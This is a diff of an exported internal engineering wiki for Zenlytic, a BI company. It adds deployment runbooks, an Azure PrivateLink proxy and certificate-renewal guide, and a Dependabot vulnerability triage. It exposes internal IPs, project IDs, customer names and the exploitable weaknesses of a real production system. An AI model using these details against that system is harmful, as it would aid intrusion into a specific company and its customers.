         "aws"
       ],
-      "lastUpdated": "2025-12-23T17:34:36.597Z"
+      "lastUpdated": "2026-08-02T03:02:51.018Z"
+    },
+    {
+      "id": "326a8dad-05ac-80e9-b828-c696be3d3e85",
+      "title": "Zenlytic RFI + Security Memory",
+      "parent": "Security Homepage",
+      "content": "# Zenlytic RFI + Security Memory\nCorrections and gap-fills from live RFI/security questionnaire sessions. Newest entries at top. Treat this as a high-priority source alongside pre-approved Q&A pairs in the skill.\n---",
+      "keywords": [
+        "security"
+      ],
+      "lastUpdated": "2026-08-02T03:02:51.669Z"
     },
     {
       "id": "3f72c85f50d947ec97543db5242260f9",
       "title": "Engineering Wiki",
       "parent": "root",
-      "content": "> 👋 Welcome to Zenlytic’s Engineering team! Our mission is to design, build, and maintain Zenlytic’s core product and features in support of our product vision.\nIf you don’t know where to start, start with Getting Started. For most things you’re looking for, you can safely ignore the Policies and Security sections. \n## Technology Vision & Roadmap\n## External \n---\nData Retention Policies \n---",
+      "content": "> 👋 Welcome to Zenlytic’s Engineering team! Our mission is to design, build, and maintain Zenlytic’s core product and features in support of our product vision.\nIf you don’t know where to start, start with Getting Started. For most things you’re looking for, you can safely ignore the Policies and Security sections. \n## Technology Vision & Roadmap\n## External \n---\nData Retention Policies \n---\n## VPC Deployment\n---",
       "keywords": [
         "security",
         "retention"
       ],
-      "lastUpdated": "2025-12-23T17:34:37.312Z"
+      "lastUpdated": "2026-08-02T03:02:52.534Z"
     },
     {
       "id": "c61320a6-760b-4a63-9f69-170b7a64b471",
@@ -958,7 +991,7 @@
       "parent": "Engineering Wiki",
       "content": "## Cloud Architecture\n---\n## Chat (Zoë) Architecture\n---\n## Component Architecture\nOriginal (Excalidraw)",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:34:37.676Z"
+      "lastUpdated": "2026-08-02T03:02:53.043Z"
     },
     {
       "id": "1bca8dad-05ac-808c-8170-ebe970188c55",
@@ -966,7 +999,7 @@
       "parent": "Architecture Diagram",
       "content": "- SEARCH_FIELDS_TOOL\n- QUERY_DATA_TOOL (referred to as DataQuestion in the code)\n- CHART_CONFIG_TOOL\n- SEARCH_DASHBOARDS_TOOL\n- CREATE_NEW_DASHBOARD_TOOL\n- ADD_QUESTIONS_TO_DASHBOARD_TOOL\n- SHOW_VIEWS_TOOL\n- CODE_INTERPRETER_TOOL\n- CREATE_FIELD_TOOL\n- USER_INTERACTION_MEMORY_TOOL\n- REASONING_TOOL\n- CAUSAL_IMPACT_ANALYZER_TOOL",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:34:38.094Z"
+      "lastUpdated": "2026-08-02T03:02:53.494Z"
     },
     {
       "id": "209a8dad-05ac-80e0-bd3d-c1504eed9633",
@@ -982,7 +1015,7 @@
         "api",
         "integration"
       ],
-      "lastUpdated": "2025-12-23T17:34:39.061Z"
+      "lastUpdated": "2026-08-02T03:02:54.834Z"
     },
     {
       "id": "209a8dad-05ac-80e7-a300-dd017988985c",
@@ -995,7 +1028,7 @@
         "infrastructure",
         "network"
       ],
-      "lastUpdated": "2025-12-23T17:34:39.899Z"
+      "lastUpdated": "2026-08-02T03:02:56.915Z"
     },
     {
       "id": "207a8dad-05ac-803f-88b7-f07f1f7dcc79",
@@ -1008,7 +1041,15 @@
         "infrastructure",
         "api"
       ],
-      "lastUpdated": "2025-12-23T17:34:40.804Z"
+      "lastUpdated": "2026-08-02T03:02:58.334Z"
+    },
+    {
+      "id": "356a8dad-05ac-8047-a376-d4cc8ceed873",
+      "title": "Project Checklist",
+      "parent": "Engineering Wiki",
+      "content": "This is the checklist for new features. This applies to net-new features that will impact the customer experience, not to bug fixes or very minor enhancements. \n• CX communication\n• Rollout Strategy\n• Marketing Communication (if applicable)\n• Docs\n• Test Plan (message in #development if you are unsure about any of these)\n• Are there DB migrations? \n• Blast radius",
+      "keywords": [],
+      "lastUpdated": "2026-08-02T03:02:59.828Z"
     },
     {
       "id": "b5eb4f7a-c7eb-4a45-bc35-0bcd9931dc4b",
@@ -1018,7 +1059,7 @@
       "keywords": [
         "integration"
       ],
-      "lastUpdated": "2025-12-23T17:34:41.955Z"
+      "lastUpdated": "2026-08-02T03:03:00.508Z"
     },
     {
       "id": "22675636-cd8c-4e73-a45f-d065f158db5e",
@@ -1030,7 +1071,7 @@
         "sso",
         "api"
       ],
-      "lastUpdated": "2025-12-23T17:34:42.739Z"
+      "lastUpdated": "2026-08-02T03:03:01.480Z"
     },
     {
       "id": "d828bc4b-c1f3-4c61-8b4a-5a82b0887983",
@@ -1038,7 +1079,7 @@
       "parent": "Engineering Wiki",
       "content": "In this document, we’ll cover how to use the extra prompt context feature when setting up Zoë, Zenlytic’s AI analyst.\n---\n# What instructions does Zoë already have?\nWhen adding new context for Zoë, you should try not to repeat or contradict instructions she is given in the Zenlytic-set system prompt. \nThese are the high-level instructions we give Zoë by default when you interact with her:\n• You are Zenlytic's self-serve Business Intelligence (BI) assistant deployed in a chat interface.\n• You operate on the company's semantic layer.\n• You are assisting the company: <your-company-name> and the current date is <current-date>\n• Clarify ambiguous questions with follow-up questions.\nDon't change these instructions when adding additional context for Zoë because doing so will confuse Zoë and hurt her performance.\n# How should I add instructions?\nWhen structuring additional instructions for Zoë, make sure they are clearly written and contain a straightforward action Zoë should follow. \nA good heuristic is: \n> If a human was skimming this, would they still get the point and do what I’m asking?\nGenerally, it’s helpful to emphasize certain points to make sure Zoë follows them. For example, if you’re trying to get Zoë to ask a follow up question for a time period on a large table saying:\n```\nAsk for a time period if not given one.\n```\nWill not work as well as:\n```\nWhen asked a question that does not contain a time period filter, you must ALWAYS ask the user for the time period they want to use to view the data.\n```\nUsing bullet points or wrapping additional logic under a “Guidelines” header is also helpful. A good example is:\n```\nAdditional Guidelines:\n- The acronym FFDC refers to the marketing function at our company. When users ask for that, interpret it as the word marketing.\n- When the user asks a question in a non-English language, you must ALWAYS respond in the same language in which you were asked the question.\n- When the user asks a question without a time period specified, you must ALWAYS ask a follow-up question to make them pick a time period.\n```",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:34:43.420Z"
+      "lastUpdated": "2026-08-02T03:03:07.564Z"
     },
     {
       "id": "1baa8dad-05ac-80ac-a8c5-e7fd0cb47f54",
@@ -1046,7 +1087,7 @@
       "parent": "Engineering Wiki",
       "content": "---\nAt Zenlytic, we believe the best insights come from matching the right tool to the right task. That’s why we’ve expanded Zoë, our conversational AI data agent, to support multiple AI models, letting users choose based on their specific needs.\nNot all AI models are the same. Some provide quick, straightforward answers, ideal for immediate insights on questions like, “What’s our top-selling product this month?” Others excel in structured problem-solving and are best for complex queries, such as analyzing deep customer trends or forecasting how new tariffs will affect production needs.\nBy empowering users to select the AI model suited to their query, Zoë ensures accuracy, speed, and relevance. Whether you need instant clarity or advanced analytical insights, Zoë provides the right tool every time you “Just Ask.”\nAvailable AI Models:\n• GPT-4o: Balanced model — great for answering straightforward questions like, “What’s our top-selling product this month?”\n• GPT-o1: Advanced reasoning model — ideal for complex, detailed analyses such as, “What factors are driving customer churn over the past quarter?”\n• Claude 3.5 Sonnet: Balanced model — suitable for quick insights and mid-level analytical tasks, like identifying sales trends.\n• Claude 3.7 Sonnet: Advanced exploratory model — best for deep dives, exploratory analysis, and nuanced insights. Highly intelligent but tends to be more verbose, making it excellent for comprehensive understanding.",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:34:44.056Z"
+      "lastUpdated": "2026-08-02T03:03:08.277Z"
     },
     {
       "id": "1d1a8dad-05ac-808e-84b0-ff824335fc9a",
@@ -1056,7 +1097,7 @@
       "keywords": [
         "sso"
       ],
-      "lastUpdated": "2025-12-23T17:34:44.783Z"
+      "lastUpdated": "2026-08-02T03:03:09.288Z"
     },
     {
       "id": "281a8dad-05ac-8064-b33d-dbab315a8baf",
@@ -1066,7 +1107,34 @@
       "keywords": [
         "integration"
       ],
-      "lastUpdated": "2025-12-23T17:34:47.149Z"
+      "lastUpdated": "2026-08-02T03:03:10.593Z"
+    },
+    {
+      "id": "348a8dad-05ac-8072-931d-dce1a9f19c74",
+      "title": "VPC deployments",
+      "parent": "Engineering Wiki",
+      "content": "# Development\n# Customers\n## Customer documentation sync for Zoë in VPC\nSource: Paul Blankley in Slack on 2026-06-30. Slack thread.\nCustomers can replicate Zenlytic documentation inside their own environment by downloading the full docs package that mirrors docs.zenlytic.com: https://github.com/Zenlytic/zenlytic-docs/releases/latest/download/docs.zip.\n• Download the latest docs.zip release and sync/unzip the contents into a customer-controlled GitLab repository inside their environment.\n• Use the GitLab MCP server to expose that repository to Zoë as an MCP-accessible documentation source.\n• Add a system-prompt instruction telling Zoë to use that MCP tool when searching Zenlytic documentation, because this is not Zoë’s default documentation lookup path.",
+      "keywords": [],
+      "lastUpdated": "2026-08-02T03:03:11.281Z"
+    },
+    {
+      "id": "341a8dad-05ac-8039-83fb-e017f85504d8",
+      "title": "Tips on debugging VPC ephemeral environments",
+      "parent": "VPC deployments",
+      "content": "There could be multiple reasons why an ephemeral environment deployment could fail.\nThis is what it looks like on the pull request. \nClick into workflow_run, if the github action fails at Deploying Helm release... like this\nthen go ahead and check the logs of the pod:\nStep 1: Sign in to GCloud\n```\ngcloud config set project non-prod-492200\n\ngcloud container clusters get-credentials zenlytic-gke-eph-shared \\\n  --region us-central1 \\\n  --project non-prod-492200\n```\nPlease reach out to Sebastian if you run into any issues with logging into the GCP project\nStep 2: Check logs on the pods\n```\n# ns stands for namespace.\n# Look for the ephemeral environmetn associated with the PR. \n# Ephemeral namespaces are prefixed with \"eph-\"\n# Ex: If your PR is located at https://github.com/Zenlytic/zenlytic/pull/7746\n# then the ephemeral environment namespace is eph-7746\nkubectl get ns\n\n# Check whether the pods are running or not\nkubectl get pods -n eph-7746\n```\nStep 3a: If you run into CreateContainerConfigError\n“Describe” the pod by running\n```\n# replace <pod_name> with the pod you are having an error with\n# replace <eph-env> with the ephemeral environment\nkubectl describe pod <pod_name> -n <eph-env>\n```\nSebastian is the owner for ephemeral environments. Reach out to Sebastian with the error message\nStep 3b: If the pod fails for other reasons \nRetrieve logs from the pod\n```\nkubectl logs <pod_name> -n <eph-env>\n```\nTips for visualizing the error better",
+      "keywords": [
+        "sso",
+        "logging"
+      ],
+      "lastUpdated": "2026-08-02T03:03:12.640Z"
+    },
+    {
+      "id": "348a8dad-05ac-8016-b047-fcd7889f999b",
+      "title": "Verizon",
+      "parent": "VPC deployments",
+      "content": "Verizon prod deployments are targeted for every Thursday. \n## Customer documentation sync for Zoë in VPC\nSource: Paul Blankley in Slack on 2026-06-30. Slack thread.\nCustomers can replicate Zenlytic documentation inside their own environment by downloading the full docs package that mirrors docs.zenlytic.com: https://github.com/Zenlytic/zenlytic-docs/releases/latest/download/docs.zip.\n• Download the latest docs.zip release and sync/unzip the contents into a customer-controlled GitLab repository inside their environment.\n• Use the GitLab MCP server to expose that repository to Zoë as an MCP-accessible documentation source.\n• Add a system-prompt instruction telling Zoë to use that MCP tool when searching Zenlytic documentation, because this is not Zoë’s default documentation lookup path.",
+      "keywords": [],
+      "lastUpdated": "2026-08-02T03:03:13.296Z"
     },
     {
       "id": "50eba629-62a7-44ff-8052-4577a5b79ce0",
@@ -1076,7 +1144,7 @@
       "keywords": [
         "aws"
       ],
-      "lastUpdated": "2025-12-23T17:34:50.736Z"
+      "lastUpdated": "2026-08-02T03:03:14.140Z"
     },
     {
       "id": "1cea8dad-05ac-801c-8359-c678d80a9d81",
@@ -1086,7 +1154,7 @@
       "keywords": [
         "aws"
       ],
-      "lastUpdated": "2025-12-23T17:34:51.861Z"
+      "lastUpdated": "2026-08-02T03:03:14.843Z"
     },
     {
       "id": "1cea8dad-05ac-8006-a808-c75cb3c4a862",
@@ -1110,7 +1178,7 @@
         "network",
         "monitoring"
       ],
-      "lastUpdated": "2025-12-23T17:34:52.543Z"
+      "lastUpdated": "2026-08-02T03:03:15.495Z"
     },
     {
       "id": "18aa8dad-05ac-80e9-92c8-ea352eb3c635",
@@ -1120,7 +1188,7 @@
       "keywords": [
         "integration"
       ],
-      "lastUpdated": "2025-12-23T17:34:53.378Z"
+      "lastUpdated": "2026-08-02T03:03:16.220Z"
     },
     {
       "id": "65edf3cb-a5d6-4e7b-a920-3cfbe8a53cfa",
@@ -1128,15 +1196,7 @@
       "parent": "Engineering Wiki",
       "content": "# Frontend\n☐ Update AG Grid License on prod once stage looks good\n# Backend\n☐ Broadly speaking to be prod ready, there should be no errors on any of the dashboards\n☐ Bottom rows still showing up as empty\n☐ Row Totals aren’t working\n☐ SQL Question is not working\n☐ Question specific errors aren’t working. This is suppose to tell the user that they need to select steps in the funnel. Check the dashboard as its seem to be all question types\n☐ Download dashboard as PDF is failing\n☐ Personal fields don’t seem to be working\n☐ Offset table calc not working in pivoted table\n☐ Percent Total on Pivots not working as expected. See ticket",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:34:54.121Z"
-    },
-    {
-      "id": "1a8a8dad-05ac-80fb-b57d-fd269b13bfb1",
-      "title": "Conversion from CRUD based endpoints to DDD",
-      "parent": "Engineering Wiki",
-      "content": "",
-      "keywords": [],
-      "lastUpdated": "2025-12-23T17:34:54.742Z"
+      "lastUpdated": "2026-08-02T03:03:17.040Z"
     },
     {
       "id": "28fa8dad-05ac-803b-b68c-fa93c32a44dc",
@@ -1146,7 +1206,7 @@
       "keywords": [
         "api"
       ],
-      "lastUpdated": "2025-12-23T17:34:55.269Z"
+      "lastUpdated": "2026-08-02T03:03:17.697Z"
     },
     {
       "id": "28fa8dad-05ac-805a-9b7f-efcef3ef5612",
@@ -1156,7 +1216,7 @@
       "keywords": [
         "api"
       ],
-      "lastUpdated": "2025-12-23T17:34:55.565Z"
+      "lastUpdated": "2026-08-02T03:03:18.333Z"
     },
     {
       "id": "28fa8dad-05ac-80b6-a92a-f804712ff563",
@@ -1166,7 +1226,81 @@
       "keywords": [
         "api"
       ],
-      "lastUpdated": "2025-12-23T17:34:56.155Z"
+      "lastUpdated": "2026-08-02T03:03:18.948Z"
+    },
+    {
+      "id": "2e2a8dad-05ac-80e5-85c0-e6a399502072",
+      "title": "List of requests",
+      "parent": "External API Architecture",
+      "content": "From Verizon\n• After the insight gets generated, a user can publish and distribute it to a team of people. Will your api support this? link\n• Will your Chat API include the dashboard distribution and configuration? link",
+      "keywords": [
+        "api"
+      ],
+      "lastUpdated": "2026-08-02T03:03:19.594Z"
+    },
+    {
+      "id": "323a8dad-05ac-8109-946b-f3cb71713079",
+      "title": "How to Set Up Azure Proxy with PrivateLink",
+      "parent": "Engineering Wiki",
+      "content": "TL;DR: We proxy AWS app traffic to customers' Azure Databricks workspaces via Private Link. Each customer gets a hostname like <customer>-dbx.zenlytic.com that routes through an Azure Application Gateway to a Private Endpoint connected to their Databricks workspace. Traffic flows over a site-to-site VPN between AWS and Azure.\n---\n# Adding a New Customer\n## Step 0: Get info from the customer\nSend the customer this message:\n> Hi [Customer],\n\nTo establish a private connection to your Databricks workspace, we need two things from you:\n\n1. Your Databricks Workspace Resource ID — You can find this in the Azure portal under your Databricks workspace properties, or by running:\naz databricks workspace show --resource-group <your-rg> --name <your-workspace-name> --query id -o tsv\nIt looks like: /subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.Databricks/workspaces/<workspace-name>\n\n2. Your Databricks workspace URL — e.g., adb-1234567890.12.azuredatabricks.net\n\nOnce we receive these, we'll create a Private Endpoint connection to your workspace. You'll see a pending connection request in your Databricks workspace (under Settings → Networking → Private Endpoint Connections) that needs to be approved by your team.\n\nThat's it — no additional infrastructure needed on your side.\n## Step 1: Set variables\nLook at the customer registry below and pick the next available priority (increments of 100, starting at 300).\n```\nCUSTOMER_NAME=\"<customer-name>\"\nDATABRICKS_RESOURCE_ID=\"<full Azure Resource ID of their Databricks workspace>\"\nDATABRICKS_HOST=\"<adb-XXXXXXXXXX.XX>\"  # the part before .azuredatabricks.net\nCUSTOMER_HOSTNAME=\"${CUSTOMER_NAME}-dbx.zenlytic.com\"\nCUSTOMER_PRIORITY=<next available priority>\n\nRESOURCE_GROUP=rg-zenlytic-aws-proxy-prod\nVNET_NAME=vnet-zenlytic-hub\nLOCATION=eastus\n```\n## Step 2: Create Private Endpoint\n```\naz network private-endpoint create \\\n  --resource-group $RESOURCE_GROUP \\\n  --name pe-databricks-$CUSTOMER_NAME \\\n  --vnet-name $VNET_NAME \\\n  --subnet snet-private-endpoints \\\n  --private-connection-resource-id $DATABRICKS_RESOURCE_ID \\\n  --group-id databricks_ui_api \\\n  --connection-name conn-$CUSTOMER_NAME \\\n  --location $LOCATION \\\n  --manual-request true \\\n  --request-message \"Zenlytic requesting private access to Databricks workspace\"\n```\nTell the customer to approve the pending connection request in Azure Portal → Databricks workspace → Settings → Networking → Private Endpoint Connections. Wait for approval before continuing.\n## Step 3: Get PE IP (after customer approves)\n```\nPE_IP=$(az network private-endpoint show \\\n  --resource-group $RESOURCE_GROUP \\\n  --name pe-databricks-$CUSTOMER_NAME \\\n  --query 'customDnsConfigs[0].ipAddresses[0]' -o tsv)\n\necho \"PE IP: $PE_IP\"\n```\n## Step 4: Configure Application Gateway\n```\n# Backend pool\naz network application-gateway address-pool create \\\n  --resource-group $RESOURCE_GROUP \\\n  --gateway-name appgw-azure-proxy \\\n  --name pool-$CUSTOMER_NAME \\\n  --servers $PE_IP\n\n# HTTP settings (rewrites Host header to real Databricks URL)\naz network application-gateway http-settings create \\\n  --resource-group $RESOURCE_GROUP \\\n  --gateway-name appgw-azure-proxy \\\n  --name settings-$CUSTOMER_NAME \\\n  --port 443 \\\n  --protocol Https \\\n  --host-name \"${DATABRICKS_HOST}.azuredatabricks.net\" \\\n  --timeout 60\n\n# Health probe\naz network application-gateway probe create \\\n  --resource-group $RESOURCE_GROUP \\\n  --gateway-name appgw-azure-proxy \\\n  --name probe-$CUSTOMER_NAME \\\n  --protocol Https \\\n  --host \"${DATABRICKS_HOST}.azuredatabricks.net\" \\\n  --path \"/\" \\\n  --interval 30 \\\n  --timeout 30 \\\n  --threshold 3\n\n# Attach probe to HTTP settings\naz network application-gateway http-settings update \\\n  --resource-group $RESOURCE_GROUP \\\n  --gateway-name appgw-azure-proxy \\\n  --name settings-$CUSTOMER_NAME \\\n  --probe probe-$CUSTOMER_NAME\n\n# Multi-site listener\naz network application-gateway http-listener create \\\n  --resource-group $RESOURCE_GROUP \\\n  --gateway-name appgw-azure-proxy \\\n  --name listener-$CUSTOMER_NAME \\\n  --frontend-ip frontend-private \\\n  --frontend-port port-https \\\n  --ssl-cert cert-proxy \\\n  --host-name $CUSTOMER_HOSTNAME\n\n# Routing rule\naz network application-gateway rule create \\\n  --resource-group $RESOURCE_GROUP \\\n  --gateway-name appgw-azure-proxy \\\n  --name rule-$CUSTOMER_NAME \\\n  --http-listener listener-$CUSTOMER_NAME \\\n  --address-pool pool-$CUSTOMER_NAME \\\n  --http-settings settings-$CUSTOMER_NAME \\\n  --priority $CUSTOMER_PRIORITY\n```\n## Step 5: DNS records\n```\n# Azure private DNS\naz network private-dns record-set a create \\\n  --resource-group $RESOURCE_GROUP \\\n  --zone-name \"privatelink.azuredatabricks.net\" \\\n  --name $DATABRICKS_HOST\n\naz network private-dns record-set a add-record \\\n  --resource-group $RESOURCE_GROUP \\\n  --zone-name \"privatelink.azuredatabricks.net\" \\\n  --record-set-name $DATABRICKS_HOST \\\n  --ipv4-address $PE_IP\n```\nThen in AWS Route 53, create an A record in the private hosted zone for zenlytic.com:\n• $CUSTOMER_HOSTNAME → 10.1.4.10\n## Step 6: Configure Zenlytic\nSet the database connection host:\n```\ncredentials.host = \"<customer>-dbx.zenlytic.com\"\n```\nStandard port 443, no special connect_args needed.\n## Step 7: Verify\n```\ncurl -vk https://$CUSTOMER_HOSTNAME\n# Expected: 303 redirect to /login.html with header \"server: databricks\"\n```\n## Step 8: Update the customer registry\nAdd a row to the registry table below with the customer's details and set status to Complete.\n---\n# Existing Customers\nAll customers share port-https (443) on the private frontend (frontend-private at 10.1.4.10). Routing is host-based via multi-site listeners. Priorities increment by 100 starting at 300 (100 and 200 are used by default/test rules).\n## Important notes\n• Host-based routing, not port-based. We use multi-site listeners with unique hostnames per customer, not unique ports. Port-based routing doesn't work with the Databricks SQL connector because it does TLS hostname verification — connecting to an IP:port fails since the cert (*.zenlytic.com) doesn't match the IP.\n• --group-id databricks_ui_api is required when creating the PE. This is the Databricks sub-resource type that grants access to both the UI and the SQL/API endpoints.\n• Cross-region works. Private endpoints support cross-region connections. Our VNet is in eastus but customers' Databricks workspaces can be in any Azure region.\n• The PE creation IS the approval request. Running az network private-endpoint create with --manual-request true automatically sends a pending connection request. There is no separate step to \"send\" a request.\n---\n# Certificate Renewal\nThe wildcard SSL cert (*.zenlytic.com) on the App Gateway is a Let's Encrypt cert valid for 90 days. When it expires, all customer connections through the proxy fail TLS verification — the Databricks SQL connector and any cert-validating client will refuse to connect. The proxy will appear to work via curl -k but production is broken. Set a calendar reminder for ~3 weeks before each expiry.\nRenewal is now automated via the certbot Route 53 plugin (certbot-dns-route53) — the DNS-01 challenge is solved automatically against the zenlytic.com hosted zone, so renewal is a single non-interactive command. All commands run from /Users/pb/azure_proxy on Paul's machine.\nGotcha: two certbots are installed on that machine. The plugin lives in the conda python311 env's certbot — the Homebrew certbot (/opt/homebrew/bin/certbot) does NOT have it and fails with \"dns-route53 plugin does not appear to be installed\". Use the full path below (or activate python311 and confirm with which certbot).\n## Step 1: Renew the cert\n```\ncd /Users/pb/azure_proxy\n\n/Users/pb/miniconda3/envs/python311/bin/certbot renew \\\n  --config-dir ./cert_config \\\n  --work-dir ./cert_work \\\n  --logs-dir ./cert_logs\n```\nCheck the current expiry any time with:\n```\nopenssl x509 -in cert_config/live/zenlytic.com/fullchain.pem -noout -dates\n```\n## Step 2: Push the new cert to the App Gateway\nThe PFX password is in Paul's 1password.\n```\nexport PFX_PASSWORD='<from 1password>'\n\nopenssl pkcs12 -export \\\n  -out wildcard.pfx \\\n  -inkey cert_config/live/zenlytic.com/privkey.pem \\\n  -in cert_config/live/zenlytic.com/fullchain.pem \\\n  -password \"pass:$PFX_PASSWORD\"\n\n# Use update, NOT create — cert-proxy already exists on the App Gateway\naz network application-gateway ssl-cert update \\\n  --resource-group rg-zenlytic-aws-proxy-prod \\\n  --gateway-name appgw-azure-proxy \\\n  --name cert-proxy \\\n  --cert-file wildcard.pfx \\\n  --cert-password \"$PFX_PASSWORD\"\n```\nApp Gateway rolls the new cert out across instances in 1–3 minutes; existing TLS sessions are not dropped.\n## Step 3: Verify\n```\n# Confirm Azure has the new cert\naz network application-gateway ssl-cert show \\\n  --resource-group rg-zenlytic-aws-proxy-prod \\\n  --gateway-name appgw-azure-proxy \\\n  --name cert-proxy \\\n  --query \"publicCertData\" -o tsv | base64 -d | openssl x509 -inform DER -noout -dates -subject\n\n# End-to-end test from a prod EC2 (no -k — must verify cert cleanly)\ncurl -v --resolve dominos-dbx.zenlytic.com:443:10.1.4.10 \\\n  https://dominos-dbx.zenlytic.com/ 2>&1 | grep -E 'expire date|HTTP/|server:|x-databricks'\n```\nExpect a future expire date, HTTP/1.1 303 See Other, and server: databricks. Finally, run a real Zenlytic query against a customer workspace to confirm the application layer is happy.\n## Step 4: Update the renewal log\n## Fallback: manual renewal\nOnly if the Route 53 plugin isn't working. certbot renew does NOT work with --manual non-interactively — use certonly --manual:\n```\ncertbot certonly --manual --preferred-challenges dns \\\n  --config-dir ./cert_config \\\n  --work-dir ./cert_work \\\n  --logs-dir ./cert_logs \\\n  -d \"*.zenlytic.com\"\n```\nCertbot pauses and prints a value for a TXT record named _acme-challenge.zenlytic.com. Add it in Route 53 (zenlytic.com hosted zone), wait ~30 seconds, verify with dig +short TXT _acme-challenge.zenlytic.com, then press Enter in certbot. Continue with Step 2 above.\nThe full runbook also lives in /Users/pb/azure_proxy/README.md.\n---\n# Architecture\n```\nAWS VPC (172.18.0.0/16)\n  └─ Zenlytic app connects to: <customer>-dbx.zenlytic.com:443\n       │\n       │  (Route 53 private hosted zone resolves to 10.1.4.10)\n       │  (Site-to-Site VPN)\n       │\nAzure VNet (10.1.0.0/16)\n  ├─ Application Gateway (10.1.4.10) on snet-appgw (10.1.4.0/24)\n  │    └─ Multi-site listener routes by Host header to correct backend\n  │         └─ Rewrites Host header to real Databricks URL for backend\n  ├─ Private Endpoints on snet-private-endpoints (10.1.3.0/24)\n  │    └─ pe-databricks-<customer> → customer's Databricks workspace\n  └─ Private DNS Zone: privatelink.azuredatabricks.net\n       └─ A records mapping Databricks hosts to PE IPs\n```\nHow routing works: Each customer gets a unique hostname (e.g., dominos-dbx.zenlytic.com). The App Gateway uses multi-site listeners on a shared HTTPS port (443) to route based on the Host header. The *.zenlytic.com wildcard SSL cert covers all customer hostnames. The App Gateway HTTP settings rewrite the Host header to the real Databricks URL before forwarding to the PE.\n---\n## One-time infrastructure setup\n## Dominos onboarding log",
+      "keywords": [
+        "tls",
+        "rto",
+        "onboarding",
+        "aws",
+        "infrastructure",
+        "network",
+        "api"
+      ],
+      "lastUpdated": "2026-08-02T03:03:20.861Z"
+    },
+    {
+      "id": "32da8dad-05ac-81cb-8044-f961ab1d6706",
+      "title": "Incident Post-Mortem Template",
+      "parent": "Engineering Wiki",
+      "content": "Incident Title: [e.g., \"API latency spike — 2026-03-24\"]\nSeverity: P0 / P1 / P2 / P3\nDate: YYYY-MM-DD\nDuration: Start → End (total minutes/hours)\nLead: [Name]\n---\n## Summary\n1–2 sentences. What happened, who was affected, how bad was it.\n---\n## Timeline\nChronological list of key events: detection, escalation, mitigation, resolution.\n---\n## Root Cause\nWhat actually broke and why.\n---\n## Impact\nUsers affected, revenue impact, SLA breach, etc.\n---\n## Action Items\n---\n## Lessons Learned\nWhat went well, what didn't, what was lucky.",
+      "keywords": [
+        "incident",
+        "breach",
+        "sso",
+        "api"
+      ],
+      "lastUpdated": "2026-08-02T03:03:21.655Z"
+    },
+    {
+      "id": "37aa8dad-05ac-80b1-af2b-d10c583f988b",
+      "title": "Critical & High CVSSv3 Triage ",
+      "parent": "Engineering Wiki",
+      "content": "# Critical Dependabot Alerts — Triage\nTriage of all open critical-severity GitHub Dependabot alerts as of June 9, 2026 (repo: Zenlytic/zenlytic). Each alert was assessed against the actual code path that consumes the dependency to determine whether the vulnerability is exploitable in our system.\nSummary: 5 open critical alerts; 0 materially exploitable among the open set. The previously-material redshift-connector RCE (#624) was remediated June 9, 2026. The remaining 5 are dev-only or transitive dependencies whose vulnerable code paths are unreachable given how we use them, and can be cleared through routine dependency upgrades.\n# High Dependabot Alerts — Triage\nTriage of all ~142 open high-severity alerts (~44 distinct packages) as of July 27, 2026 (last reconciled July 20, 2026). Duplicate alerts for the same advisory across version ranges/manifests are consolidated into one row. Tables are grouped by service.\nMaterially exploitable: 2 findings — both NEW this week: Pillow #704 (JPEG2000 tiled-decode DoS on user-uploaded chat images, back_end) and GitPython #725/#724 (env-var exfiltration via customer-settable clone URL, back_end + git_store). The two prior material findings (SAML-ACS DoS #660/#662) remain remediated (June 26, 2026). See summary at the bottom. Everything else is dev/build tooling, unreachable code paths, or requires preconditions our code verifiably doesn't have.\n## Frontend — axios (29 alerts, 15 distinct advisories)\nContext: the frontend is a browser SPA. Its direct dependency is axios 0.21.1 (March 2021); axios 1.x copies come transitively via aws-amplify and vite-plugin-mkcert (dev). Verified code facts: axios is called in 14 files with fixed endpoints (config.apiGateway.URL + hardcoded paths) and JWT headers from makeHeaders(); no axios.create, interceptors, baseURL, xsrfCookieName, or untrusted config objects anywhere.\nAction: upgrade the direct axios dependency from 0.21.1 to ≥1.16.0 (our usage is plain axios.get/post(url, data, {headers}) — modest migration) and bump aws-amplify; this clears all 29 alerts.\n## Frontend — other runtime npm packages\nContext: routing is React Router Data Mode, client-only (createBrowserRouter with one catch-all route; zero loaders/actions/SSR — verified). Charts: vega-lite specs arrive from the backend/LLM (vega_config in questionApi.ts) and are compiled and embedded verbatim in QuestionResultChartVega.tsx.\n## Frontend — dev tooling\n## Renderer service (headless-Chrome screenshot Lambda)\nContext: the renderer navigates only to hardcoded Zenlytic URLs, loads config from our own S3 bucket, and writes output back to S3. No proxies, no FTP, no untrusted tar extraction, no websocket server (verified in services/renderer/index.js).\n## Backend (main FastAPI service) — Python\n## Git store & Lambda services — Python\nContext: git_store is internal-only (reachable only from the backend at git-store:8000; no nginx/public route). The Lambda is a cron app that only calls our own internal API.\n## Summary — High severity\n~142 open alerts → ~60 distinct advisories. 2 materially exploitable findings (both new this week; see the July 27, 2026 reconcile below). Both findings that were open last week — python-multipart #660 and starlette #662 (unauthenticated DoS via the public SAML ACS endpoint) — were remediated on June 26, 2026 (commit efb43ffda4: back_end bumped to python-multipart 0.0.30 + starlette 1.3.1 + fastapi 0.133.1). The original triage detail is retained below as the audit trail (both now resolved):\n- python-multipart quadratic urlencoded DoS (#660) — the public/unauthenticated SAML ACS endpoint (saml_providers/routes.py, Auth(public=True)) parses application/x-www-form-urlencoded via Form(); a tiny ;-separated body triggers O(n²) CPU → unauthenticated worker-exhaustion DoS. Fix: bump python-multipart to ≥0.0.30.\n- starlette request.form() limit-bypass DoS (#662) — same public SAML ACS endpoint; request.form() ignores field/size limits for urlencoded bodies, so an oversized body blocks the event loop / exhausts memory. Fix: bump starlette to ≥1.3.1 (needs a fastapi bump).\nMaterial findings remediated in earlier reconciles: vega-functions #373 (vega 6 upgrade), pillow #418/#561/#530 (12.2.0), storybook #441 (≥8.6.17), python-multipart #602 (≥0.0.27), python-multipart #660 + starlette #662 (back_end fastapi/starlette/multipart bump, June 26, 2026).\nJune 24, 2026 reconcile: no new critical/high alerts opened and none closed since June 16. Open set unchanged (5 critical / 107 high). The two material SAML-ACS DoS findings (#660, #662) remain open — re-verified the public saml_acs() Form() code 